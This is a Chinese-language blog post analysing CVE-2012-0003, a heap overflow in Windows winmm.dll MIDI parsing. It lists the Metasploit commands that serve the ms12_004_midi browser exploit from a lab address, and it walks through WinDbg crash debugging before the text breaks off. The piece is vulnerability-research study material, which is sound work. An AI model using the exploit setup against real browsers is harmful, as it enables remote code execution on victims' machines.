---
layout:     post
title:      漏洞战争-cve-2012-0003
date:       2016-08-23
summary:    漏洞战争-cve-2012-0003
categories: 二进制
tags:
 - 漏洞战争
 - 漏洞分析
 - 堆溢出
---

### 0x00 about

```
这个漏洞是由于微软的多媒体库winmm.dll(c:\windows\system32\winmm.dll)在处理MIDI文件时,由于对数据的处理不当导致的
堆溢出,攻击者可以在网页中嵌入特殊的MIDI文件来远程执行任意代码

```

### 0x01 准备工作

```
1>使用msf中的exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.118.129:8080/test.html
    奇怪的是在系统中不存在test.html,但是访问上面生成的网马链接确实会中马,后来查看msf中的exp:ms12_004_midi.rb,里
    面生成html的代码为
        send_response(cli, html, {'Content-Type'=>'text/html'})
    send_response函数在msfapi中有如下用法
```

<a href="https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method">msfapi_send_response</a>

```
    也即相当于msf内置webserver通过send_response函数发送html代码到客户端实现下面这个链接的访问
        http://192.168.118.129:8080/test.html
    这种方式比较特殊,可能msf的web是ruby的某个类似python下的Django的web框架开发的

```

### 0x01 调试分析

```
打开iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    这里如果在windbg中设置!gflag +hpa不会成功,可能是winxp或是windbg的问题
windbg:f6附加iexplore.exe
!gflag
    0:016> !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ie打开http://192.168.118.129:8080/test.html
    (7ac.208): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=15467019 edi=15464f60
    eip=76b2d224 esp=34c6fe80 ebp=34c6fea0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    WINMM!midiOutPlayNextPolyEvent+0x1ec:
    76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:15467019=??

    到这里只知道76b2d224处有内存访问异常,然而要想写出exp,还需要弄清参数传递过程,这个"堆溢出"cve的利用不是
    DWORD SHOOT,而是巧妙地构造html代码达到控制eip的目的,如果是利用堆溢出,一般会想到在上面访问异常时通过找到一个
    DWORD SHOOT的机会来覆盖异常处理相关的函数地址来控制eip,且要在可控数据复制到内存后找到堆分配调用

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    此时中断下来

    






```
